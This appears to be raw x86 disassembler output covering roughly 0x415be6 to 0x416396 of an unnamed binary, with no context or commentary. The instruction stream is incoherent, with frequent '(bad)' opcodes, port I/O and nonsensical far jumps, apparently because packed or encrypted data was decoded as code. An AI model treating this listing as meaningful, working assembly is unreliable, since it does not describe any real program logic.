  415be6:	retf   
  415be7:	ret    0xb5fb
  415bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415beb:	test   DWORD PTR [ebx-0x24ccac6],0xfa81aeb0
  415bf5:	shr    BYTE PTR [esi-0x5b73a958],cl
  415bfb:	push   cs
  415bfc:	push   0x13
  415bfe:	mov    ch,BYTE PTR [ebx]
  415c00:	cmp    BYTE PTR [eax-0xef98be8],0x52
  415c07:	outs   dx,BYTE PTR ds:[esi]
  415c08:	dec    ebx
  415c09:	mov    bl,0x9d
  415c0b:	mov    eax,0xe3d51a69
  415c10:	shr    BYTE PTR [edi+eiz*1],1
  415c13:	stos   BYTE PTR es:[edi],al
  415c14:	(bad)  
  415c16:	jb     0x415c69
  415c18:	enter  0xa964,0x2
  415c1c:	in     eax,dx
  415c1d:	test   bl,ah
  415c1f:	add    eax,0xffffffb3
  415c22:	push   ebx
  415c23:	or     esp,DWORD PTR ds:0x406988a2
  415c29:	(bad)  
  415c2a:	outs   dx,DWORD PTR ds:[esi]
  415c2b:	aas    
  415c2c:	adc    DWORD PTR [ebx-0x460b116f],esi
  415c32:	add    BYTE PTR ds:0xab46d2e3,bl
  415c38:	rol    DWORD PTR [ebx],0x6f
  415c3b:	loopne 0x415bde
  415c3d:	adc    BYTE PTR [ecx-0x21],ch
  415c40:	push   cs
  415c41:	sbb    edi,DWORD PTR [edi+ebx*8-0x72]
  415c45:	lahf   
  415c46:	xor    bh,al
  415c48:	ins    BYTE PTR es:[edi],dx
  415c49:	sub    eax,0xfcd1d7d5
  415c4e:	lea    esp,[ebp+0x55]
  415c51:	aas    
  415c52:	pop    edx
  415c53:	pop    ss
  415c54:	out    dx,al
  415c55:	mov    esi,0x94dd0493
  415c5a:	pushf  
  415c5b:	(bad)  
  415c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c5e:	ror    DWORD PTR [edx-0xfcf8a45],0x76
  415c65:	cwde   
  415c66:	stc    
  415c67:	xor    DWORD PTR [edx],eax
  415c69:	pop    edi
  415c6a:	aam    0xd0
  415c6c:	sbb    BYTE PTR [esi-0x44b6eea2],dh
  415c72:	jg     0x415c63
  415c74:	repnz stos DWORD PTR es:[edi],eax
  415c76:	das    
  415c77:	int    0x2c
  415c79:	add    eax,0x7790b45
  415c7e:	pop    ebp
  415c7f:	and    al,0x91
  415c81:	ror    BYTE PTR [edx],1
  415c83:	aaa    
  415c84:	loopne 0x415c34
  415c86:	or     DWORD PTR [ebp-0x41],0xc5c9df86
  415c8d:	fcom   QWORD PTR [ebx-0x164aff67]
  415c93:	pop    edx
  415c94:	cmp    al,0x61
  415c96:	xor    edi,DWORD PTR [esi-0x4efe45a0]
  415c9c:	jmp    0x415d01
  415c9e:	mov    edi,0x9fcf23ec
  415ca3:	(bad)  
  415ca4:	ss push cs
  415ca6:	loope  0x415c7b
  415ca8:	test   DWORD PTR [esp+esi*1-0x921d579],edx
  415caf:	stc    
  415cb0:	dec    eax
  415cb1:	in     al,0x97
  415cb3:	pop    ecx
  415cb4:	nop
  415cb5:	rcr    bh,0x8f
  415cb8:	cld    
  415cb9:	inc    esp
  415cba:	or     al,0xe6
  415cbc:	mov    ecx,0xc1efce8a
  415cc1:	mov    WORD PTR [ecx+0x49],es
  415cc4:	scas   al,BYTE PTR es:[edi]
  415cc5:	xchg   esp,eax
  415cc6:	inc    edx
  415cc7:	dec    ebx
  415cc8:	shl    BYTE PTR [ecx],cl
  415cca:	xor    ch,BYTE PTR [edi-0x12]
  415ccd:	test   eax,0x96d09bf2
  415cd2:	mov    esp,0x48c0bccb
  415cd7:	movhlps xmm5,xmm7
  415cda:	mov    ah,ah
  415cdc:	inc    esp
  415cdd:	and    eax,DWORD PTR [ebx+0x15]
  415ce0:	add    bh,BYTE PTR [ebx]
  415ce2:	sar    DWORD PTR [eax+0x5df43315],0xa1
  415ce9:	fstp   DWORD PTR [edx+0x1cf65020]
  415cef:	sub    al,0x63
  415cf1:	pusha  
  415cf2:	pop    ds
  415cf3:	ja     0x415d2a
  415cf5:	stos   DWORD PTR es:[edi],eax
  415cf6:	scas   al,BYTE PTR es:[edi]
  415cf7:	pusha  
  415cf8:	add    DWORD PTR [eax+esi*4-0x72],ecx
  415cfc:	icebp  
  415cfd:	ds and ah,dh
  415d00:	push   ebp
  415d01:	sbb    ebp,DWORD PTR [eax]
  415d03:	mov    dh,BYTE PTR [eax-0x25]
  415d06:	outs   dx,BYTE PTR ds:[esi]
  415d07:	mov    ebp,0x33e1259f
  415d0c:	xchg   esi,eax
  415d0d:	jno    0x415cd2
  415d0f:	stos   BYTE PTR es:[edi],al
  415d10:	and    edi,DWORD PTR [edx+eiz*4-0x60]
  415d14:	dec    ebx
  415d15:	xor    ch,BYTE PTR [eax+0x5287cf3c]
  415d1b:	sub    al,0x15
  415d1d:	lahf   
  415d1e:	inc    ebx
  415d1f:	repnz repz out dx,al
  415d22:	add    bh,BYTE PTR [ebp+eiz*8+0x5]
  415d26:	lods   al,BYTE PTR ds:[esi]
  415d27:	lds    ebx,FWORD PTR [ebx-0x34]
  415d2a:	dec    esi
  415d2b:	jo     0x415d0f
  415d2d:	xor    DWORD PTR [edx],esi
  415d2f:	add    ah,BYTE PTR [esi]
  415d31:	jbe    0x415cbf
  415d33:	push   cs
  415d34:	fcom   DWORD PTR [ebx]
  415d36:	mov    dl,0x32
  415d38:	mov    esi,0x48120ac7
  415d3d:	stos   BYTE PTR es:[edi],al
  415d3e:	push   ds
  415d3f:	enter  0x1e1,0xeb
  415d43:	dec    edi
  415d44:	pop    ebx
  415d45:	sbb    bl,ch
  415d47:	lea    ecx,[esi]
  415d49:	fcomp  DWORD PTR [esi-0x5840076a]
  415d4f:	ret    
  415d50:	lea    esp,ds:0xe69e64a
  415d56:	push   0x24
  415d58:	mov    ah,0xfd
  415d5a:	jle    0x415dd1
  415d5c:	adc    al,0x57
  415d5e:	fisttp WORD PTR [ecx+0x2e6120ca]
  415d64:	cld    
  415d65:	test   esi,ecx
  415d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d68:	push   esi
  415d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d6a:	mov    DWORD PTR [ebp-0x7d913628],esp
  415d70:	lods   al,BYTE PTR ds:[esi]
  415d71:	pushf  
  415d72:	imul   eax,DWORD PTR [ebx+0xc57a4df],0xf230cae4
  415d7c:	inc    ecx
  415d7d:	iret   
  415d7e:	cli    
  415d7f:	call   FWORD PTR [ebx]
  415d81:	pop    ebx
  415d82:	mov    al,ds:0x76fbb61
  415d87:	loopne 0x415dd0
  415d89:	or     DWORD PTR [edi+0x33803a0],esp
  415d8f:	pop    ebx
  415d90:	pushf  
  415d91:	aad    0x29
  415d93:	inc    edi
  415d94:	stos   DWORD PTR es:[edi],eax
  415d95:	(bad)  
  415d96:	rcl    ch,1
  415d98:	push   edx
  415d99:	or     BYTE PTR [eax],ah
  415d9b:	pop    edx
  415d9c:	sub    ecx,DWORD PTR [eax]
  415d9e:	imul   edi,DWORD PTR [ebp+eax*1-0x60],0x7
  415da3:	iret   
  415da4:	retf   0x7fa5
  415da7:	test   BYTE PTR [edi-0x1d],al
  415daa:	test   DWORD PTR ds:0x65bbe3b9,ebp
  415db0:	ret    0xd1c3
  415db3:	pop    ecx
  415db4:	cmp    DWORD PTR [ecx+ebp*8+0x6d],edi
  415db8:	in     eax,dx
  415db9:	mov    eax,ds:0xd25d5eaf
  415dbe:	and    ebx,DWORD PTR [esi+0x7f9f5714]
  415dc4:	fiadd  WORD PTR [ebp+0x3503ebea]
  415dca:	mov    ch,0xab
  415dcc:	push   edi
  415dcd:	xor    eax,0xa58c0791
  415dd2:	outs   dx,DWORD PTR ds:[esi]
  415dd3:	cli    
  415dd4:	imul   eax,DWORD PTR [ecx+0x5e],0xffffffee
  415dd8:	gs push es
  415dda:	repz push es
  415ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ddd:	enter  0xc7cf,0xf8
  415de1:	jl     0x415da8
  415de3:	inc    si
  415de5:	push   ebp
  415de6:	mov    edx,0xddc15b10
  415deb:	xchg   esp,ebx
  415ded:	ja     0x415d88
  415def:	fsubr  DWORD PTR [ecx-0x45]
  415df2:	test   DWORD PTR [ebx+0x7460bbb3],eax
  415df8:	inc    esp
  415df9:	adc    bh,BYTE PTR ds:0x413201e6
  415dff:	rcr    bh,cl
  415e01:	xchg   ebp,eax
  415e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e03:	push   ecx
  415e04:	fwait
  415e05:	mov    ebp,0x8bdf1e8a
  415e0a:	retf   0x8d5d
  415e0d:	loop   0x415e73
  415e0f:	call   0xef21482d
  415e14:	pop    ebx
  415e15:	pushf  
  415e16:	ja     0x415dbd
  415e18:	jmp    0x415dac
  415e1a:	push   ss
  415e1b:	jne    0x415df9
  415e1d:	push   ss
  415e1e:	mov    esi,DWORD PTR [esi+0x2038ad15]
  415e24:	mov    ds:0x7515203a,al
  415e29:	outs   dx,DWORD PTR ds:[esi]
  415e2a:	inc    ebx
  415e2b:	stos   DWORD PTR es:[edi],eax
  415e2c:	dec    esi
  415e2d:	stos   DWORD PTR es:[edi],eax
  415e2e:	xchg   DWORD PTR [esi+0x579eaa3b],ebx
  415e34:	inc    ecx
  415e35:	lock xchg ecx,eax
  415e37:	adc    al,0xee
  415e39:	jmp    0xf0b08d4d
  415e3e:	and    eax,ebp
  415e40:	cmp    eax,0xfa91a0c0
  415e45:	cmc    
  415e46:	in     eax,dx
  415e47:	out    dx,al
  415e48:	leave  
  415e49:	cmp    BYTE PTR [edi+0x300bf5ac],bl
  415e4f:	mov    edx,0xd407a1d8
  415e54:	sbb    DWORD PTR [ebx],ebp
  415e56:	(bad)
  415e59:	and    eax,0x5b94585b
  415e5e:	mov    ch,0xe1
  415e60:	retw   0x64f6
  415e64:	test   DWORD PTR ds:0xf589ff29,ebx
  415e6a:	sub    esp,ebx
  415e6c:	test   BYTE PTR [esi*2-0x27b27db4],dl
  415e73:	(bad)  
  415e74:	push   edx
  415e75:	out    0x11,al
  415e77:	js     0x415eae
  415e79:	sbb    al,dh
  415e7b:	das    
  415e7c:	sbb    BYTE PTR [ebp+0x48],cl
  415e7f:	or     dl,BYTE PTR [eax]
  415e81:	lods   al,BYTE PTR ds:[esi]
  415e82:	in     eax,dx
  415e83:	or     BYTE PTR fs:[edi+0x72b77cc3],0x80
  415e8b:	cmp    esi,DWORD PTR [edx+0x251d825f]
  415e91:	lods   eax,DWORD PTR ds:[esi]
  415e92:	adc    BYTE PTR [edi],dh
  415e94:	and    dh,cl
  415e96:	arpl   WORD PTR [eax+0x7a],cx
  415e99:	ins    BYTE PTR es:[edi],dx
  415e9a:	pop    ebx
  415e9b:	cmp    BYTE PTR [edx+0x44],0x8e
  415e9f:	bound  edx,QWORD PTR [esi-0x52]
  415ea2:	jo     0x415e57
  415ea4:	inc    ebx
  415ea5:	xor    ah,BYTE PTR [ecx+0xb]
  415ea8:	jmp    FWORD PTR [edi+ebp*1]
  415eab:	popa   
  415eac:	adc    BYTE PTR [edx],dh
  415eae:	out    0x12,al
  415eb0:	mov    edi,0x72c4edab
  415eb5:	mov    ebx,DWORD PTR [ebp-0x41]
  415eb8:	and    BYTE PTR [ebp+0x5caaf6f0],0xd9
  415ebf:	cmp    eax,0x523217c4
  415ec4:	sub    ebx,DWORD PTR [edx+0x4819ac4d]
  415eca:	or     edx,ebx
  415ecc:	mov    edx,0x4e2f5c0d
  415ed1:	add    eax,0x46
  415ed4:	into   
  415ed5:	stos   DWORD PTR es:[edi],eax
  415ed6:	or     eax,0x98a6c571
  415edb:	int    0x4e
  415edd:	push   0xffffffb9
  415edf:	sbb    bh,dh
  415ee1:	push   esp
  415ee2:	sti    
  415ee3:	sti    
  415ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee5:	ret    0x7b7e
  415ee8:	mov    edi,0xfb9afda7
  415eed:	ds mov cl,0xd9
  415ef0:	inc    ebp
  415ef1:	(bad)  
  415ef2:	pop    ebp
  415ef3:	adc    ebp,esi
  415ef5:	sbb    ebx,DWORD PTR [ecx]
  415ef7:	mov    ebx,esi
  415ef9:	dec    ebp
  415efa:	shr    dh,cl
  415efc:	mov    eax,ebp
  415efe:	and    al,0xf7
  415f00:	cmp    ch,BYTE PTR [esi+esi*2]
  415f03:	sub    DWORD PTR [edx+0x56eab3ae],ebx
  415f09:	popf   
  415f0a:	rcr    BYTE PTR [ecx],0x8d
  415f0d:	retf   
  415f0e:	jno    0x415f8e
  415f10:	xor    al,0xcb
  415f12:	jo     0x415f36
  415f14:	aas    
  415f15:	test   eax,0xdf80a79f
  415f1a:	and    bh,BYTE PTR [edi]
  415f1c:	pop    esp
  415f1d:	std    
  415f1e:	loop   0x415ef6
  415f20:	(bad)  
  415f21:	lods   al,BYTE PTR ds:[esi]
  415f22:	iret   
  415f23:	ins    BYTE PTR es:[edi],dx
  415f24:	pop    ebp
  415f25:	cwde   
  415f26:	dec    esp
  415f27:	lds    eax,FWORD PTR ds:0x46c44a6
  415f2d:	pop    edx
  415f2e:	cdq    
  415f2f:	xor    al,0x66
  415f31:	hlt    
  415f32:	iret   
  415f33:	sbb    al,0xb1
  415f35:	jmp    0x415ec6
  415f37:	inc    eax
  415f38:	call   0x5af:0xf79f899f
  415f3f:	ja     0x415eda
  415f41:	cwde   
  415f42:	out    0xad,al
  415f44:	(bad)  
  415f45:	mov    ecx,0xdca697b9
  415f4a:	(bad)  
  415f4b:	xchg   edx,eax
  415f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f4d:	pop    ds
  415f4e:	lahf   
  415f4f:	or     eax,0x9b3eac52
  415f54:	jb     0x415f96
  415f56:	pop    ds
  415f57:	popa   
  415f58:	push   ecx
  415f59:	lea    ecx,[esi+0x4b1d7106]
  415f5f:	xor    eax,DWORD PTR [ecx-0x6a]
  415f62:	add    BYTE PTR [esi-0x35],ch
  415f65:	out    dx,eax
  415f66:	jb     0x415f15
  415f68:	stc    
  415f69:	repnz mov al,0xde
  415f6c:	fiadd  DWORD PTR [edx]
  415f6e:	cwde   
  415f6f:	mov    eax,DWORD PTR [edx]
  415f71:	push   es
  415f72:	xchg   edi,eax
  415f73:	into   
  415f74:	(bad)  
  415f75:	(bad)  
  415f77:	adc    edx,DWORD PTR [edi+0x1a24c855]
  415f7d:	xchg   edi,eax
  415f7e:	mov    DWORD PTR [ebx+0x9ec68c4],edi
  415f84:	push   ss
  415f85:	stos   DWORD PTR es:[edi],eax
  415f86:	sahf   
  415f87:	into   
  415f88:	mov    ah,0x27
  415f8a:	sbb    DWORD PTR [eax+0x33],ebx
  415f8d:	fs dec eax
  415f8f:	aad    0x66
  415f91:	cmp    cl,BYTE PTR [esi]
  415f93:	sahf   
  415f94:	jo     0x415f3d
  415f96:	sbb    esi,edx
  415f98:	int    0x1a
  415f9a:	adc    bh,ch
  415f9c:	lock into 
  415f9e:	add    DWORD PTR [esi-0x6771a121],ecx
  415fa4:	iret   
  415fa5:	ds test al,0x43
  415fa8:	aaa    
  415fa9:	dec    ecx
  415faa:	je     0x415fed
  415fac:	iret   
  415fad:	div    BYTE PTR [ecx+0x40]
  415fb0:	pop    edx
  415fb1:	retf   
  415fb2:	(bad)  
  415fb3:	lea    edx,[ecx]
  415fb5:	jmp    0xe55c:0x5491bb7
  415fbc:	jo     0x415f93
  415fbe:	ret    0x34da
  415fc1:	aaa    
  415fc2:	pusha  
  415fc3:	inc    ebx
  415fc4:	adc    ebx,0xc4422d58
  415fca:	arpl   WORD PTR [esi+0x59fa21d],sp
  415fd0:	jns    0x415ff7
  415fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd3:	push   eax
  415fd4:	or     DWORD PTR [ecx+0x74],0x7949dfaf
  415fdb:	push   eax
  415fdc:	push   ds
  415fdd:	in     al,0xc6
  415fdf:	inc    edx
  415fe0:	not    DWORD PTR [ecx+eiz*2-0x28]
  415fe4:	(bad)  [edx-0x5]
  415fe7:	or     eax,0x2c4fdd03
  415fec:	call   0x8263:0x920d05f4
  415ff3:	push   0xffffffc4
  415ff5:	cli    
  415ff6:	imul   ebx,DWORD PTR [ecx-0x14],0xffffffb0
  415ffa:	and    eax,0x4aca95b3
  415fff:	ja     0x416000
  416001:	je     0x416042
  416003:	repnz scas eax,DWORD PTR es:[edi]
  416005:	pop    ebp
  416006:	adc    eax,0x87692eb0
  41600b:	dec    eax
  41600c:	outs   dx,BYTE PTR ds:[esi]
  41600d:	bnd jg 0x416010
  416010:	pop    es
  416011:	inc    ecx
  416012:	jg     0x416032
  416014:	shl    cl,1
  416016:	xor    eax,DWORD PTR [ecx]
  416018:	mul    BYTE PTR [ebx]
  41601a:	jne    0x416019
  41601c:	sub    al,0x4b
  41601e:	imul   esi,DWORD PTR [edi+ebp*4+0xb810f1e],0x19
  416026:	iret   
  416027:	and    cl,BYTE PTR [ebp-0x16]
  41602a:	ja     0x41603c
  41602c:	stos   BYTE PTR es:[edi],al
  41602d:	outs   dx,DWORD PTR ds:[esi]
  41602e:	and    BYTE PTR [eax+0x68],bl
  416031:	rcl    BYTE PTR [ecx+0x2c],0xa2
  416035:	fstp   TBYTE PTR [eax]
  416037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416038:	sub    al,0xef
  41603a:	xchg   WORD PTR [edi-0x7f7eb674],sp
  416041:	clc    
  416042:	mov    edx,0xa38fc712
  416047:	fistp  WORD PTR [eax-0x19]
  41604a:	ss inc edx
  41604c:	aad    0x4
  41604e:	shr    BYTE PTR ds:0xea7eef67,0xa6
  416055:	pop    ebp
  416056:	(bad)  
  416057:	int    0xf3
  416059:	xchg   ebp,eax
  41605a:	(bad)  
  41605b:	repz pop edx
  41605d:	push   ds
  41605e:	jae    0x4160bf
  416060:	mov    ds,WORD PTR [eax+0x858bd4d]
  416066:	pop    ebx
  416067:	data16 and bl,BYTE PTR [esi+0x4e]
  41606b:	sub    eax,0xaa4c644e
  416070:	sti    
  416071:	sub    BYTE PTR [edx-0x4d1a1275],al
  416077:	add    BYTE PTR [esi],dh
  416079:	push   0x42df9056
  41607e:	sbb    DWORD PTR [ebx],ebx
  416080:	or     eax,0x44441049
  416085:	push   ss
  416086:	xrelease xchg BYTE PTR [edi-0x44],bh
  41608a:	push   eax
  41608b:	xchg   esp,eax
  41608c:	xchg   ebx,eax
  41608d:	mul    DWORD PTR ds:0xa3a93368
  416093:	jl     0x416088
  416095:	inc    ebx
  416096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416097:	mov    bl,0x21
  416099:	aaa    
  41609a:	cmp    ecx,DWORD PTR [esi+0x260ec6bd]
  4160a0:	out    0xb0,eax
  4160a2:	jmp    0x416050
  4160a4:	mov    ah,0x94
  4160a6:	sti    
  4160a7:	out    dx,al
  4160a8:	lods   eax,DWORD PTR ds:[esi]
  4160a9:	ret    
  4160aa:	sar    DWORD PTR [ecx+0x60],0xf6
  4160ae:	jo     0x416088
  4160b0:	aaa    
  4160b1:	repnz std 
  4160b3:	ror    BYTE PTR [esi],cl
  4160b5:	xchg   edx,eax
  4160b6:	and    al,0x25
  4160b8:	and    al,0x51
  4160ba:	mov    ecx,0x10e4623f
  4160bf:	jne    0x4160db
  4160c1:	jge    0x416062
  4160c3:	mul    ebx
  4160c5:	gs stc 
  4160c7:	push   ebp
  4160c8:	sbb    ch,ah
  4160ca:	leave  
  4160cb:	outs   dx,BYTE PTR ds:[esi]
  4160cc:	scas   al,BYTE PTR es:[edi]
  4160cd:	push   ebp
  4160ce:	xchg   edi,eax
  4160cf:	and    al,0x30
  4160d1:	push   cs
  4160d2:	mov    al,ds:0x969be1fd
  4160d7:	mov    bh,0x5e
  4160d9:	test   al,0x99
  4160db:	jns    0x4160bc
  4160dd:	scas   eax,DWORD PTR es:[edi]
  4160de:	ret    0xcdd3
  4160e1:	jg     0x41613d
  4160e3:	mov    ebx,0xc978b9d5
  4160e8:	jbe    0x4160de
  4160ea:	ficom  WORD PTR ds:0xc1e9a565
  4160f0:	mov    ah,BYTE PTR [edx-0x37820b41]
  4160f6:	icebp  
  4160f7:	imul   edi,DWORD PTR [edx+0x16],0x7b8a75fe
  4160fe:	(bad)  
  4160ff:	imul   edi,esp,0xffffff9d
  416102:	sbb    BYTE PTR [edx+0x4d],dh
  416105:	imul   eax,ecx,0xffffffc2
  416108:	xchg   esp,eax
  416109:	std    
  41610a:	pop    ss
  41610b:	mov    esp,0xd31a358d
  416110:	loop   0x416110
  416112:	sub    eax,0x6c0f5060
  416117:	loop   0x4160c5
  416119:	fs mov bl,0x86
  41611c:	sbb    BYTE PTR [edi-0x4e],dl
  41611f:	jno    0xf8bc2883
  416125:	ins    BYTE PTR es:[edi],dx
  416126:	ins    BYTE PTR es:[edi],dx
  416127:	loope  0x4161a6
  416129:	xchg   edi,eax
  41612a:	in     eax,0x5d
  41612c:	clc    
  41612d:	and    dl,BYTE PTR [ecx+0x8347ef4]
  416133:	int    0xab
  416135:	jne    0x41614e
  416137:	sbb    eax,0x27
  41613a:	sub    eax,0xf96acfa4
  41613f:	js     0x4160cc
  416141:	test   ecx,ecx
  416143:	rcr    DWORD PTR [edi],0x5e
  416146:	and    eax,0x911499a3
  41614b:	dec    ebx
  41614c:	xchg   BYTE PTR [edi+0x39],ch
  41614f:	fs adc al,0xe1
  416152:	sbb    al,0xa0
  416154:	stos   BYTE PTR es:[edi],al
  416155:	fisub  WORD PTR [ebx-0x122164ac]
  41615b:	call   0xa109:0x661f2683
  416162:	out    dx,al
  416163:	and    BYTE PTR [eax-0x2d],bl
  416166:	jmp    0xa141:0x97499106
  41616d:	imul   esp,esi,0x23
  416170:	cdq    
  416171:	aad    0x7
  416173:	icebp  
  416174:	repz push ds
  416176:	mov    esi,0x8fb0a2ee
  41617b:	or     eax,DWORD PTR [esi]
  41617d:	in     eax,dx
  41617e:	lea    esi,[ecx+edx*1]
  416181:	outs   dx,BYTE PTR ds:[esi]
  416182:	mov    ebx,0x37a11d99
  416187:	iret   
  416188:	and    eax,0x592dafbf
  41618d:	push   ebx
  41618e:	aam    0x31
  416190:	hlt    
  416191:	sahf   
  416192:	and    BYTE PTR [eax-0x24],0xdf
  416196:	mov    bh,0x16
  416198:	shl    BYTE PTR ss:[ebx+edi*4+0x1f91af11],1
  4161a0:	sbb    eax,edi
  4161a2:	or     DWORD PTR [edi-0x7c],edi
  4161a5:	(bad)  
  4161a7:	dec    edx
  4161a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161a9:	mov    cl,0x54
  4161ab:	sbb    BYTE PTR [esp+eax*8+0x3202250f],ch
  4161b2:	xor    BYTE PTR [ebx+0x1a],ah
  4161b5:	data16 cli 
  4161b7:	mov    eax,0x7b0b5402
  4161bc:	adc    al,0x6f
  4161be:	push   es
  4161bf:	mov    ds:0x83c10afe,eax
  4161c4:	cmp    ebx,edx
  4161c6:	std    
  4161c7:	arpl   WORD PTR fs:[ebp+0x1a02d2d8],di
  4161ce:	cs pop ebx
  4161d0:	xchg   BYTE PTR [ebp+0x19ca390a],ah
  4161d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161d7:	gs push edx
  4161d9:	out    0x75,eax
  4161db:	fcom   DWORD PTR [esi+0x6cabd87d]
  4161e1:	das    
  4161e2:	and    eax,0x995662c1
  4161e7:	jmp    DWORD PTR [eax-0x6886c0c2]
  4161ed:	push   cs
  4161ee:	popf   
  4161ef:	je     0x4161aa
  4161f1:	test   bl,bh
  4161f3:	arpl   WORD PTR ss:[ebx+0x2e],cx
  4161f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f8:	fcom   QWORD PTR [edx]
  4161fa:	clc    
  4161fb:	popf   
  4161fc:	cs mov al,0x2
  4161ff:	dec    edi
  416200:	or     al,0xd8
  416202:	ds jmp 0x41618f
  416205:	sar    bh,0x89
  416208:	cs jl  0x416275
  41620b:	push   ebp
  41620c:	aas    
  41620d:	out    0x13,eax
  41620f:	jmp    0xbc151761
  416214:	dec    edi
  416215:	arpl   WORD PTR [esp+ebp*4-0x3720146e],di
  41621c:	jp     0x4161d1
  41621e:	xchg   esi,eax
  41621f:	(bad)  
  416220:	pop    edi
  416221:	das    
  416222:	sbb    DWORD PTR [ecx],esp
  416224:	adc    al,0xb5
  416226:	rol    ah,0x6b
  416229:	iret   
  41622a:	push   edx
  41622b:	jne    0x416263
  41622d:	int3   
  41622e:	mov    edi,DWORD PTR [edi]
  416230:	dec    ecx
  416231:	ss popa 
  416233:	or     eax,0xdf2be46a
  416238:	sub    al,0xe8
  41623a:	and    eax,0x65e4860f
  41623f:	inc    edx
  416240:	pop    eax
  416241:	sub    BYTE PTR ds:0xf5d5e5ff,0x56
  416248:	adc    BYTE PTR [edx+0x11],dl
  41624b:	enter  0x4fca,0xe9
  41624f:	adc    BYTE PTR [ecx-0x11b7f9e4],0xcb
  416256:	mov    BYTE PTR [ebx],cl
  416258:	cmp    DWORD PTR [ebp+0x15],edi
  41625b:	aaa    
  41625c:	out    dx,eax
  41625d:	shl    edx,0x71
  416260:	(bad)  
  416261:	jle    0x416226
  416263:	adc    edi,ebp
  416265:	xor    al,0x2b
  416267:	push   ebx
  416268:	jne    0x4162ce
  41626a:	jb     0x4162eb
  41626c:	and    eax,0x7ade9e11
  416271:	lea    ebx,[ebp-0x53]
  416274:	or     cl,BYTE PTR [eax+0x5912d153]
  41627a:	sbb    cl,al
  41627c:	pop    ebp
  41627d:	mov    al,0x10
  41627f:	xchg   esp,eax
  416280:	push   ss
  416281:	cli    
  416282:	pop    edi
  416283:	jmp    0x416236
  416285:	ins    DWORD PTR es:[edi],dx
  416286:	dec    edi
  416287:	inc    esp
  416288:	pop    esi
  416289:	je     0x416277
  41628b:	adc    edx,DWORD PTR ds:0xf5634e81
  416291:	ret    0x3060
  416294:	cmp    esp,eax
  416296:	mov    dh,0x3b
  416298:	fstp   TBYTE PTR [ecx-0x265e0404]
  41629e:	out    0x6,al
  4162a0:	fisttp WORD PTR [edx+0x4c]
  4162a3:	into   
  4162a4:	dec    esp
  4162a5:	or     edi,DWORD PTR ds:0xf1a8d219
  4162ab:	stos   DWORD PTR es:[edi],eax
  4162ac:	mov    eax,0x29c25763
  4162b1:	inc    edi
  4162b2:	push   es
  4162b3:	ds cdq 
  4162b5:	inc    edx
  4162b6:	xor    BYTE PTR ds:0xf3ed8f95,ch
  4162bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162bd:	loope  0x416241
  4162bf:	aaa    
  4162c0:	cmp    BYTE PTR [esi+0x27],0x67
  4162c4:	inc    edx
  4162c5:	lahf   
  4162c6:	repnz mov eax,ds:0xe4041480
  4162cc:	dec    ebx
  4162cd:	add    DWORD PTR [ecx-0x164d205a],eax
  4162d3:	fdivrp st(0),st
  4162d5:	push   edi
  4162d6:	jo     0x4162a6
  4162d8:	loopne 0x41626e
  4162da:	push   eax
  4162db:	push   ss
  4162dc:	popa   
  4162dd:	xchg   ebx,eax
  4162de:	push   es
  4162df:	sub    ecx,DWORD PTR [ecx+ecx*1+0x6b]
  4162e3:	jmp    0x3a9a:0xc8f75fb
  4162ea:	dec    ebx
  4162eb:	mov    ch,cl
  4162ed:	ja     0x4162c6
  4162ef:	jnp    0x4162ea
  4162f1:	stos   DWORD PTR es:[edi],eax
  4162f2:	fnsave [ecx]
  4162f4:	adc    dl,ah
  4162f6:	mov    WORD PTR [esi+0x28],?
  4162f9:	aas    
  4162fa:	dec    esp
  4162fb:	sub    al,0x10
  4162fd:	int3   
  4162fe:	dec    eax
  4162ff:	idiv   BYTE PTR [ebp+0x627ba6ab]
  416305:	(bad)  [eax-0xfeb121f]
  41630b:	xor    DWORD PTR [ebx],ebx
  41630d:	std    
  41630e:	int3   
  41630f:	sbb    al,0x47
  416311:	lds    esp,FWORD PTR [esp+ecx*4]
  416314:	mov    dl,0xe5
  416316:	test   al,0x28
  416318:	fnstcw WORD PTR [edx+0x1fc9feeb]
  41631e:	pop    edi
  41631f:	popf   
  416320:	lds    edi,FWORD PTR [ebx+0x9]
  416323:	lods   al,BYTE PTR ds:[esi]
  416324:	push   ebx
  416325:	idiv   ebx
  416327:	ficom  WORD PTR [edx+0x7b609fb4]
  41632d:	fiadd  DWORD PTR [edi+0x4a]
  416330:	and    al,0x9d
  416332:	bound  esp,QWORD PTR [ebp+0x34]
  416335:	cmp    bl,BYTE PTR [ebp+0xcfec11e]
  41633b:	mov    WORD PTR [edx-0x64],es
  41633e:	loopne 0x4163ba
  416340:	(bad)  [edx-0x47863c51]
  416346:	sub    BYTE PTR [edi],ah
  416348:	push   0xffffffde
  41634a:	mov    esp,0xf98429cb
  41634f:	sub    al,0x39
  416351:	test   eax,0x8ab3211b
  416356:	ret    
  416357:	not    DWORD PTR [ebx+0x290c210c]
  41635d:	dec    esp
  41635e:	std    
  41635f:	pusha  
  416360:	mov    edi,0x698305b9
  416365:	pop    ds
  416366:	pop    DWORD PTR [eax+0x30d0ddec]
  41636c:	and    edi,DWORD PTR [edi+0xf]
  41636f:	push   ss
  416370:	retf   0x8d4b
  416373:	push   es
  416374:	inc    edi
  416375:	imul   edi,DWORD PTR [edx+ebx*1],0xd46a61c6
  41637c:	jmp    0x41632f
  41637e:	in     al,0x3f
  416380:	(bad)  
  416381:	call   0x4ca3:0xd6b98c50
  416388:	pop    eax
  416389:	mov    esi,0x3f5234fd
  41638e:	pop    es
  41638f:	inc    edi
  416390:	rol    BYTE PTR [ebp-0x7f],cl
  416393:	pop    ebx
  416394:	jl     0x41632d
  416396:	sub    bh,BYTE PTR [eax-0x2486c18e]
